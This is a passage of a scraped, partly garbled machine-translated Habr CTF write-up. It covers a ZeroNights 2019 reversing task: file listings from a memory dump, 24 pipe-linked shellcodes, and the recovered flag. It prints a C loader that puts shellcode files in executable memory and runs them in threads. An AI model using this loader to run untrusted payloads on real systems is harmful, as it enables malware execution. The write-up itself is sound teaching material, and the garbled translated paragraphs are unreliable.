SIGN.MEDIA=1C1DAB0 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C1DAB0 zn_2019\Injector2.exe SIGN.MEDIA=1C1DAB0 zn_2019\With_little_debug.exe SIGN.MEDIA=1C1DAB0 zn_2019\injector.exe SIGN.MEDIA=1C1DAB0 zn_2019\note.exe SIGN.MEDIA=1C1DAB0 zn_2019\note2.exe SIGN.MEDIA=1C1DAB0 zn_2019\note3.exe SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C30058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C30058 zn_2019\Injector2.exe SIGN.MEDIA=1C30058 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C30058 zn_2019\With_little_debug.exe SIGN.MEDIA=1C30058 zn_2019\injector.exe SIGN.MEDIA=1C30058 zn_2019\injector.exe SIGN.MEDIA=1C30058 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C30058 zn_2019\note.exe SIGN.MEDIA=1C30058 zn_2019\note2.exe SIGN.MEDIA=1C30058 zn_2019\note3.exe SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C89400 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C89400 zn_2019\Injector2.exe SIGN.MEDIA=1C89400 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C89400 zn_2019\NOTE1.exe SIGN.MEDIA=1C89400 zn_2019\With_little_debug.exe SIGN.MEDIA=1C89400 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=1C89400 zn_2019\injector.exe SIGN.MEDIA=1C89400 zn_2019\nnnn.exe SIGN.MEDIA=1C89400 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C89400 zn_2019\note.exe SIGN.MEDIA=1C89400 zn_2019\note.exe SIGN.MEDIA=1C89400 zn_2019\note2.exe SIGN.MEDIA=1C89400 zn_2019\note3.exe SIGN.MEDIA=1C89400 zn_2019\note4.exe SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=1C8A800 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=1C8A800 zn_2019\Injector2.exe SIGN.MEDIA=1C8A800 zn_2019\Is_it_you_suspended_or_me.exe SIGN.MEDIA=1C8A800 zn_2019\NOTE1.exe SIGN.MEDIA=1C8A800 zn_2019\With_little_debug.exe SIGN.MEDIA=1C8A800 zn_2019\im_spawned_you_so_i_should_kill_you.exe SIGN.MEDIA=1C8A800 zn_2019\injector.exe SIGN.MEDIA=1C8A800 zn_2019\nnnn.exe SIGN.MEDIA=1C8A800 zn_2019\not_so_sleepy_r_we.exe SIGN.MEDIA=1C8A800 zn_2019\note.exe SIGN.MEDIA=1C8A800 zn_2019\note2.exe SIGN.MEDIA=1C8A800 zn_2019\note3.exe SIGN.MEDIA=1C8A800 zn_2019\note4.exe SIGN.MEDIA=2D702C zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=3EDC2 zn_2019\server\a.exe SIGN.MEDIA=3EDC2 zn_2019\server\hui.exe SIGN.MEDIA=3EDC2 zn_2019\server\run.exe SIGN.MEDIA=4482C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=4482C zn_2019\PEview.exe SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=5B0058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=5B0058 zn_2019\Injector2.exe SIGN.MEDIA=5B0058 zn_2019\injector.exe SIGN.MEDIA=5B0058 zn_2019\note.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Discord.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Far.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\FileZillaFTPclient.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\InputDirector.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\KeePass.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\PicPick.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\Skype.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\UpdateManager.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\VBoxManager.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\idaq.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\javaw.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\lunix.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\paint.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\python3.7.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\r.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\svghost.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\tsm.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\usha.exe SIGN.MEDIA=A856FE8 zn_2019\server\hui\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe SIGN.MEDIA=AB82C zn_2019\ConsoleApplication5.exe SIGN.MEDIA=AB82C zn_2019\injector.exe SIGN.MEDIA=B06D4C64 zn_2019\server\a.exe SIGN.MEDIA=B06D4C64 zn_2019\server\hui.exe SIGN.MEDIA=B06D4C64 zn_2019\server\run.exe SIGN.MEDIA=B06D4C64 zn_2019\server\video_xxx_kopati4_nadaval_ogurcov_kroshu.mp4.exe SIGN.MEDIA=BA802 zn_2019\server\run.exe SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=E00058 zn_2019\Injector2.exe SIGN.MEDIA=E00058 zn_2019\injector.exe SIGN.MEDIA=E00058 zn_2019\note.exe SIGN.MEDIA=E00058 zn_2019\note2.exe SIGN.MEDIA=E00058 zn_2019\note2.exe SIGN.MEDIA=E9982 zn_2019\server\run.exe</code> </pre> <br><p> I used my old tool to get filesystem structure out of NTFS records (a lot of FILE records usually cached in RAM). </p><br><p><img src="https://habrastorage.org/webt/x7/bf/tq/x7bftqu47ozkqm1ps96i6luh9za.png"><br><img src="https://habrastorage.org/webt/u9/uo/mz/u9uomzuew2uy6ib7tdqpltzozao.png"></p><br><p> <strong>data_storage</strong> is small enough to contain some resident $DATA inside FILE record, so we can extract it. </p><br><p> This file contains shellcode. All it does is resolving CreateNamedPipeA by hash using special function (see Figure below) and calling it with <strong>"\.\pipe\zn_shell_stor"</strong> argument. </p><br><p><img src="https://habrastorage.org/webt/ag/d-/9v/agd-9vmbes5yrnupfxrucg9a3cs.png"></p><br><p> I highlighted part of this function, this bytes can be used to located other 24 shellcodes inside memory dump. </p><br><p> One of shellcode #21 contained references to other, it is probably the main one. </p><br><pre> <code class="plaintext hljs">Global\vtHAjnNbCecOeNAnVeQFmdRw Global\jGzXXZJbXGPYniopljDEdwuD Global\jpBuyMNJzdnpwHimVlcBkwGo Global\ArlCJOxJFOKRkqOLcBhvjYqj Global\THxjCBohxSlNgCFbwJsHujqk Global\BOiJhsLFBuZdsFdCrLKEucpJ Global\iYxszVIFfsuzzEmGwgOQeEcb Global\NOluZoXPJalShopCCuNnWQbR Global\GCrtPmNEAOsZpSNNBdiYQfgz Global\pVVgeqcREhXSgKCwhkeyfTXw Global\trsQPehKvlxBJhEqIPtwzjxi Global\ngVrhgAEqcDssFsNerrAZsFz Global\KiZvGyiMnyTgvQdFNGcudfTY Global\FzXvKPKGCPMAERklFMXVMYga Global\nCZpFZPtyidhFOvVeemfyJAC Global\pjRmfOLLBXIbsJholoasvrqC Global\mhOVYcYRKgWdABAsgkvrcOOM Global\syGiShcLTXfQYGAAiafYBxoF Global\KbFVsPCPZrfVlUIQlvVoJLXW Global\XbuYiHCxQLTLApuToFldJIgI Global\auFqpIQAlsHcvjPEakqHyIeA Global\MrnXOMJvHmYBxRfkbLBUYWgn Global\GYVOmvrLhCpgQUPfnOshzzem Global\qaswedfrtghyujkiol121232 \\.\pipe\zn_shell_stor</code> </pre> <br><p> Every shellcode is started with CALL $+X instruction (E8 ?? ?? ?? ??), followed by data block and executable code. Code is looking for some functions and evaluates logic based on data read from pipe <strong>"\.\pipe\zn_shell_stor"</strong> . </p><br><div class="scrollable-table"><table><thead><tr><th> File </th><th> Tags </th><th> Mutex </th></tr></thead><tbody><tr><td> b1 </td><td> mov mov </td><td> Global\GCrtPmNEAOsZpSNNBdiYQfgz </td></tr><tr><td> b2 </td><td> SBOX "axfksyBLjRfMFZXdINqyTXcekgCxPRNpKtmTAj SUdmElMsuKYkmFYbJxSbXwxmvQ" </td><td> Global\NOluZoXPJalShopCCuNnWQbR </td></tr><tr><td> b3 </td><td> inc byte [rbp+0Ch] </td><td> Global\ngVrhgAEqcDssFsNerrAZsFz </td></tr><tr><td> b4 </td><td> repne scasb strlen() == 18 </td><td> Global\jpBuyMNJzdnpwHimVlcBkwGo </td></tr><tr><td> b5 </td><td>  ?? </td><td> Global\ArlCJOxJFOKRkqOLcBhvjYqj </td></tr><tr><td> b6 </td><td> xor BUFFER "\x31\x2A\x72\xC8\x5E\x08\xC5\xFE \x07\x44\xCB\xEB\x76\x3B\xE1\x3A\x83" </td><td> Global\MrnXOMJvHmYBxRfkbLBUYWgn </td></tr><tr><td> b7 </td><td>  ?? </td><td> Global\GYVOmvrLhCpgQUPfnOshzzem </td></tr><tr><td> b8 </td><td> cmp word [rbp+0Ch], 12h </td><td> Global\KbFVsPCPZrfVlUIQlvVoJLXW </td></tr><tr><td> b9 </td><td>  ?? </td><td> Global\BOiJhsLFBuZdsFdCrLKEucpJ </td></tr><tr><td> b10 </td><td>  ?? </td><td> Global\iYxszVIFfsuzzEmGwgOQeEcb </td></tr><tr><td> b11 </td><td> cmp </td><td> Global\pjRmfOLLBXIbsJholoasvrqC </td></tr><tr><td> b12 </td><td> add xor cl x2 </td><td> Global\nCZpFZPtyidhFOvVeemfyJAC </td></tr><tr><td> b13 </td><td> inc [rbp+0Ch] </td><td> Global\auFqpIQAlsHcvjPEakqHyIeA </td></tr><tr><td> b14 </td><td> dw[rbp+0Ch] = dw[rbp+0Ch] + dw[rbp+0Ch] </td><td> Global\syGiShcLTXfQYGAAiafYBxoF </td></tr><tr><td> b15 </td><td> WIN! Sleep Beep </td><td> Global\XbuYiHCxQLTLApuToFldJIgI </td></tr><tr><td> b16 </td><td> save byte </td><td> Global\mhOVYcYRKgWdABAsgkvrcOOM </td></tr><tr><td> b17 </td><td> add xor cl x2 </td><td> Global\FzXvKPKGCPMAERklFMXVMYga </td></tr><tr><td> b18 </td><td> zero rbp (0, 211h, 80h) </td><td> Global\trsQPehKvlxBJhEqIPtwzjxi </td></tr><tr><td> b19 </td><td>  ?? </td><td> Global\KiZvGyiMnyTgvQdFNGcudfTY </td></tr><tr><td> b20 </td><td> Read from C:\beeps\flag.txt </td><td> Global\vtHAjnNbCecOeNAnVeQFmdRw </td></tr><tr><td> b21 </td><td> MAIN </td><td></td></tr><tr><td> b22 </td><td> Xor </td><td> Global\THxjCBohxSlNgCFbwJsHujqk </td></tr><tr><td> b23 </td><td> cmp dw[rbp+0Ch], 256 dec </td><td> Global\pVVgeqcREhXSgKCwhkeyfTXw </td></tr><tr><td> b24 </td><td> beep(1000, 1100) </td><td> Global\jGzXXZJbXGPYniopljDEdwuD </td></tr></tbody></table></div><br><p> Understanding of shellcode actions is a little bit hard because everything tied together via pipe (A calls B, B calls C and etc.). We are required to jump from one shellcode to another during reversing. </p><br><p> I decided to execute it all and see what happens. All shellcodes was saved as files <strong>bN</strong> , where N is a number in range from 1 to 24 in order of appearing in memory dump. Dump #21 is the main dispatcher (it must be loaded first). File <strong><em>C:\beeps\flag.txt</em></strong> should be present in system for #20 to work. </p><br><pre> <code class="plaintext hljs">#include &lt;windows.h&gt; void load_shellcode(int index) { FILE* fp; DWORD dwThread; int size; CHAR filename[32]; sprintf_s(filename, "b%i", index); fopen_s(&amp;fp, filename, "rb"); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); LPVOID pMem = VirtualAlloc( NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ); printf("Loaded %i | size=%i | at %p\n", index, size, pMem); fread(pMem, 1, size, fp); CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMem, 0, 0, &amp;dwThread); fclose(fp); } int main() { load_shellcode(21); Sleep(1000); for (int i = 1; i &lt;= 24; i++) { if (i == 21) continue; load_shellcode(i); } while (1) Sleep(1000); }</code> </pre> <br><p> I created <strong>C:\beeps\flag.txt</strong> with some dummy content (length is 17 as hinted by one of the shellcodes) and also set a breakpoint at module doing xor with buffer (#6). </p><br><p> Program executed and flag showed up in memory after XOR operation. </p><br><p> Flag: <strong><em>zn{$ucH <em>SL0W</em> !pC}</em></strong> </p></div></div><br><p>  sysenter    6 .   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="></a> . </p><br><h2>  Algunas estad√≠sticas </h2><br><p>                .   136     . </p><br><p>       . <br>       ‚Äî ASR-EHD  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Digital Security</a> .      (AV1ct0r),     22 15   . </p><br><p>     Protected Shell  RuCTFE.       ‚Äî 10.   vos,     1 26. </p><br><p> ,     .   12-13    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">ZeroNights</a> . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/472416/">https://habr.com/ru/post/472416/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../472404/index.html">C√°lculo de colisi√≥n 2D: Algoritmo de Gilbert-Johnson-Kirti</a></li>
<li><a href="../472406/index.html">Ampliar el centro de datos durante la entrega de pizza</a></li>
<li><a href="../472410/index.html">Dise√±o de sistemas de color disponibles</a></li>
<li><a href="../472412/index.html">Analista de sistemas y m√©tricas de productos: ¬øagitar pero no mezclar?</a></li>
<li><a href="../472414/index.html">La larga historia de los reactores de neutrones r√°pidos y la promesa de un ciclo cerrado de combustible</a></li>
<li><a href="../472418/index.html">C√≥mo mantener los derechos de desarrollo personalizado</a></li>
<li><a href="../472420/index.html">Hacer que la interfaz sea m√°s receptiva gracias a Promise diferido</a></li>
<li><a href="../472422/index.html">Sber X RamblerFront & Meet Up</a></li>
<li><a href="../472426/index.html">Semana de la seguridad 43: la vida secreta de IoT Hanipots</a></li>
<li><a href="../472428/index.html">Operador de kubernetes de Tarantool</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>